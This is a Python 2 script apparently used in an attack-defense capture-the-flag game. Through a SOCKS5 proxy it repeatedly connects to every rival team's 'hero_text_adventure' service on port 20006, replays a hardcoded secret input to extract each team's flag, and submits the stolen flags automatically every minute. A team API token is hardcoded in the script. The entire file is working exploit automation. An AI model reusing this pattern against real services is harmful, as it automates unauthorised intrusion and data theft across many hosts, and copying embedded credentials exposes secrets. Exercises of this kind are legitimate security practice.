import base64
import socks
import socket
import json
from swpag_client import Team # pip install swpag_client
import socks # pip install PySocks
import socket
from pwn import *
import time

def hostToIP(host):
   num = int(host.replace("team",""))
   part = "{0}.{1}".format(129+((num&0xff00)>>8),(num&0xff))
   return "172.31."+part

def runJob(team):
   routine = ['y', team['flag_id'], 'VnciQ4bWH']

   try:
       s = remote(hostToIP(team['hostname']), 20006, timeout=0.2)
   except socks.GeneralProxyError:
       return False
   try:
       s.recv(1024)
       s.send('y\n')
       s.recv(1024)
       s.send(routine[1] + '\n')
       s.recv(1024)
       s.recv(1024)
       s.send(routine[2]+'\n')
       f = s.recv(1024)
       f = f.split(' ')[-1]
       f = f.strip()
       print f
       return(f)
   except EOFError:
      return False

if __name__ == "__main__":
   print "Starting"
   context.proxy=(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 4445)
   socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 4445)
   socket.socket = socks.socksocket
   while(1):
      t = Team(None, "muVraUlLU7m0MM9dmg4P4auy59t5PFdg")
      targets = t.get_targets("hero_text_adventure")
      for target in targets:
         flag = runJob(target)
         if (flag):
            t.submit_flag([flag])
      print "Waiting for next round plz"
      time.sleep(60)

